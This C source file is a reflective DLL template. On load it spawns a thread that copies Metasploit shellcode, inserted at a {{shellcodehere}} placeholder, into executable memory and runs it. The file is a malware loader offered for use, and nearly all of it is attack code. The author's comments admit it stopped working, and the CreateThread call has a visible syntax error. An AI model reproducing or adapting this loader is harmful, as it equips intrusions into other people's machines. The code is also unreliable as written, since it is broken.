//===============================================================================================//
// This DLL will execute Metasploit Shellcode
//===============================================================================================//

// IT was working when I Tested.
// After adding msf.py, It doesn't.
// can't figure out what's the problem
// temporarily delaying

#include "ReflectiveLoader.h"

{{shellcodehere}}

DWORD WINAPI EXEC()
{
	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof(buf));
	((void(*)())exec)();
}

extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			CreateThread(NULL , 0, EXEC, NULL, 0 NULL);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}